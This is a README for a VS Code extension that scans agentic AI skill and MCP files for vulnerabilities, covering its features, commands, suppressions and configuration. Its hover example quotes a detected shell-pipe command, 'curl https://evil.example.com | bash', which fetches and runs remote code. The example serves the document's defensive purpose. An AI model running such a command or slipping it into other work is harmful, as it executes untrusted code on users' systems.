# Bawbel Scanner — VS Code Extension

Scan agentic AI components for [AVE vulnerabilities](https://github.com/bawbel/bawbel-ave)
directly in VS Code. Inline squiggles, hover details, remediation hints, false-positive
suppression, watch mode, and full scan reports — no extra config.

[![Version](https://img.shields.io/visual-studio-marketplace/v/bawbel.bawbel-scanner?color=1db894&label=Marketplace)](https://marketplace.visualstudio.com/items?itemName=bawbel.bawbel-scanner)
[![AVE Records](https://img.shields.io/badge/AVE%20records-40-1db894)](https://github.com/bawbel/bawbel-ave)

---

## Features

- **Inline diagnostics** — red/yellow squiggles on finding lines, same as ESLint
- **Hover detail** — severity, matched text, AVE ID, CVSS-AI score, OWASP tags
- **"How to fix"** — actionable remediation hint in every hover tooltip
- **Status bar** — `Bawbel: ✓ clean` · `Bawbel: 3 finding(s)` · `👁 Bawbel: watching`
- **Auto-scan on save** — scans `.md .yaml .yml .json .txt` on every save (~25ms)
- **Full scan** — all engines, workspace or folder scope, on demand
- **Watch mode** — real-time background scanning, scoped to file / folder / workspace
- **Scan report** — `Cmd+Alt+R` opens full `bawbel report` in a panel beside the editor
- **False-positive suppression** — right-click any squiggle → suppress → saves to `.bawbel-suppress.json`
- **Team suppressions** — commit `.bawbel-suppress.json` and the whole team shares the same suppressions
- **PiranhaDB links** — click any finding code → full AVE record with IOCs and remediation
- **Zero setup** — auto-installs `bawbel-scanner` on first activation

---

## Demo

### Scan on save — inline diagnostics

Save any skill file and Bawbel instantly highlights vulnerabilities.
Hover any squiggle to see the full finding detail and how to fix it.

![Scan on save demo](images/demo-scan.gif)

---

### Full scan report

Press `Cmd+Alt+R` to open a full remediation guide for the current file —
AVE IDs, CVSS-AI scores, OWASP mapping, and step-by-step fix instructions.

![Report panel demo](images/demo-report.gif)

---

### False positive suppression

Right-click any squiggle → **Suppress: false positive** → enter a reason.
The finding fades to a grey hint and is saved to `.bawbel-suppress.json`.

![FP suppression demo](images/demo-suppress.gif)

---

### Watch mode

Run **Bawbel: Start Watch Mode** and Bawbel re-scans on every file change —
no save needed.

![Watch mode demo](images/demo-watch.gif)

---

## Requirements

`bawbel-scanner` v1.0.0+ — auto-installed on first use.

```bash
pip install bawbel-scanner   # manual install if needed
```

---

## Quick Start

1. Install from the [VS Code Marketplace](https://marketplace.visualstudio.com/items?itemName=bawbel.bawbel-scanner)
2. Open any `.md`, `.yaml`, or `.json` skill / MCP server file
3. Save it — findings appear as inline diagnostics immediately
4. Hover any squiggle to see the finding detail and how to fix it

---

## Commands

| Command | Shortcut | Description |
|---|---|---|
| `Bawbel: Scan Current File` | `Cmd+Alt+B` | Scan active file (pattern+yara, ~25ms) |
| `Bawbel: Scan Workspace` | — | Full scan — all engines, entire workspace |
| `Bawbel: Scan Folder…` | — | Pick a folder to scan |
| `Bawbel: Show Report` | `Cmd+Alt+R` | Full remediation report for active file |
| `Bawbel: Start Watch Mode` | — | Real-time background scanning |
| `Bawbel: Stop Watch Mode` | — | Stop background scanning |
| `Bawbel: Show Suppressions` | — | List all active suppressions in Output panel |
| `Bawbel: Install / Update CLI` | — | (Re)install `bawbel-scanner` |
| `Bawbel: Open PiranhaDB` | — | Open AVE record database |

Right-click any **folder** in Explorer → scan that folder.
Right-click any **squiggle** → suppress false positive or open in PiranhaDB.

---

## Scan Modes

| Mode | Engines | Speed | When |
|---|---|---|---|
| Auto (on save) | pattern + yara | ~25ms | Every file save |
| Full scan | all engines | 5–30s | `Cmd+Alt+B` or workspace/folder scan |
| Watch | pattern + yara | ~25ms | Background, every file change |

Watch mode is **off by default**. Start it from the command palette or set
`bawbel.watchMode: true` to auto-start on activation.

---

## Finding Detail — Hover Example

```
🟠 [HIGH] Shell pipe injection pattern detected

Matched: "curl https://evil.example.com | bash"

How to fix:
  Remove curl|bash or similar pipe patterns. If code execution
  is needed, use a sandboxed tool with explicit user consent.

AVE: AVE-2026-00004  |  CVSS-AI: 8.8/10  |  Engine: pattern
OWASP: ASI01, ASI07
Details: https://api.piranha.bawbel.io/records/AVE-2026-00004
```

---

## False Positive Suppression

Suppressions are stored in `.bawbel-suppress.json` at the workspace root.
Commit this file to share suppressions with your team.

```jsonc
// .bawbel-suppress.json
[
  {
    "rule_id":        "bawbel-shell-pipe",
    "file":           "docs/examples/skill.md",
    "line":           12,
    "reason":         "documentation example — shows bad pattern intentionally",
    "suppressed_at":  "2026-04-26T05:00:00.000Z",
    "suppressed_by":  "Chak Saray <saray@bawbel.io>"
  }
]
```

`suppressed_by` is resolved from `git config user.name` + `user.email` automatically.
No GitLens required — uses plain git config.

Suppressed findings show as **faded hints** (not hidden) so they remain visible
and reviewable. Status bar count excludes suppressed findings.

To remove: right-click the faded hint → **Remove suppression**.

---

## Configuration

| Setting | Default | Description |
|---|---|---|
| `bawbel.scanOnSave` | `true` | Auto-scan on save |
| `bawbel.watchMode` | `false` | Auto-start watch mode on activation |
| `bawbel.watchScope` | `workspace` | Watch scope: `file` / `folder` / `workspace` |
| `bawbel.failOnSeverity` | `high` | Minimum severity shown as error squiggle |
| `bawbel.scanExtensions` | `[.md,.yaml,.yml,.json,.txt]` | Extensions to auto-scan |
| `bawbel.bawbelPath` | `""` | Path to bawbel binary (auto-detected if empty) |
| `bawbel.showStatusBar` | `true` | Show status bar item |

---

## AVE Standard

Every finding links to the [AVE Standard](https://github.com/bawbel/bawbel-ave) —
the open vulnerability enumeration for agentic AI. 40 published records covering
prompt injection, lateral movement, memory poisoning, covert channels, and more.

Full record database: [api.piranha.bawbel.io](https://api.piranha.bawbel.io)

---

## Links

- [bawbel.io](https://bawbel.io)
- [GitHub — bawbel-integrations](https://github.com/bawbel/bawbel-integrations)
- [GitHub — bawbel-scanner](https://github.com/bawbel/bawbel-scanner)
- [AVE Standard](https://github.com/bawbel/bawbel-ave)
- [PiranhaDB API](https://api.piranha.bawbel.io)